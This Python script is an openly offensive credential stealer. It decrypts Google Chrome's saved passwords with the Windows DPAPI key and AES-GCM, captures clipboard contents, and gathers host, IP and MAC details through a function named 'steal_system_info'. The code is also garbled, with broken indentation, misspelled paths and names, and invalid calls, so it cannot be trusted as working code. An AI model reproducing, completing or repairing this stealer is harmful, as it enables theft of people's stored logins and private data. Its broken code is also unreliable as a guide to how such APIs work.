import os
import json
import base64
import shutil
import sqlite3
from win32crypt import CryptUnprotectData
from Crypto.Cipher import AES
import pyperclip
import platform
import re
import uuid
import socket
import requests

def get_decryption_key():
    try:
        local_state_path = os.path.join(os.environ['USERPROFILE'], 'AppData', 'Local', 'Google', 'Chrome', 'User Data', 'Local Data')
        with open(local_state_path, 'r',encoding='utf-8') as file:
            local_state = json.loads(file.read())
        encrypted_key = base64.b64decode(local_state['os_crypt']['encrypted_key'])
        encrypted_key = encrypted_key[5:]
        return CryptUnprotectData(encrypted_key, None,None,None,0)[1]
    except Exception as e:
        print(f"Error obtaining decryption key: {0}")
return None
    

def decrypt_password(password,key):
    try:
        if password.startswith(b'v10') or password.startswith(b'v11'):
            iv = password[3:15]
            encrypted_password = password[15:-16]
            cipher = AES.new(key,AES,MODE_GCM, iv)
            decrypted_pass = cipher.decrypt(encrypted_password)
            return decrypted_pass.decode()
        else:
            return cryptUnprotectData(password, None, None, None, 0)[1]
    except Exception as e:
        print(f'Error decrypting password: {e}')
 return None    
            
    

def extract_browser_passwords():
    key = get_decryption_key()
    if key is None:
    return []
    
    credentials = []
    profiles = ['Default', 'Guest Profile']
    base_path = os.path.join(os.environ['USERPROFILE'], r'AppData\Local\Google\Chorme\User Data')
    
    for profiles in profiles:
        login_db_path = os.path.join(base_path, profile, 'Login Data')
        if os.path.exists(login_db_path):
            try:
                shutil.copy2(login_db_path, 'Login Data.db')
                conn = sqlite3.connect('Login Data.db')
                cursor = conn.cursor()
                cursor = execute('SELECT origin_url, username_value, password_value From logins')
                for row in cursor.fetchall():
                    origin_url = row[0]
                    username = row[1]
                    encrypted_password = [2]
                    decrypted_password = decrypt_password(encrypted_password,key)
                    if decrypted_password:
                        credentials.append({
                            'profile': profile,
                            'url' : origin_url,
                            'username' : username,
                            'password' : decrypted_password
                        })
                cursor.close()
                conn.close()
            except Exception as e:
                print(f"Error extracting data from {profiles}: {e}")
            finally:
                if os.path.exists('Login Data.db'):
                    os.remove('Login Data.db')
return credentials                
                                    
def capture_clipboard():
    try:
        clipboard_content = pyperclip.paste()
        return clipboard_content
    except Exception as e:
        print(f"Error capturing content: {e}")
return None
                        
            
def steal_system_info():
    try:
        info = {
            'platform' : platform.system(),
            'platform-release' : platform.release(),
            'platform-version' : platform.version(),
            'architecture' : platform.machine(),
            'hostname' : socket.gethostbyname(),
            'ip-address': socket.gethostbyname(socket.gethostbyname()),
            'mac-address': ':'.join(re.findall('..', '%012x' % uuid.getnode())),
            'processor': platform.processor(),
        }

        try:
            response = requests.get('https://api.ipify.org?format=json')
            global_ip = response.json().get('ip', 'N/A')
            info['global-ip-address'] = global_ip
        except Exception as e:
            print(f'Error fetching global IP address.')
            info['global-ip-address'] = 'Could not fetch global IP address'
               
        return info
    except Exception as e:
        print("Error capturing system info.")
        return {}
    
if __name__ == '__main__':
    
    passwords = extract_browser_passwords()
    print(f"Extracted Browser Password:")
    for cred in passwords:
        print(f"URL : {cred['url']}")
        print(f"Username: {cred['Username']}")
        print(f"Password: {cred['password']}")
        print('-' * 40)
       
    clipboard_content = capture_clipboard()   
    if clipboard_content:
        print('\nClipboard content:')    
        print(clipboard_content)
        
    system_info = steal_system_info()
    print('\nSystem Information:')
    for key, value in system_info.items():
        print(f'{key}:{value}')
            
    
    
    
        
            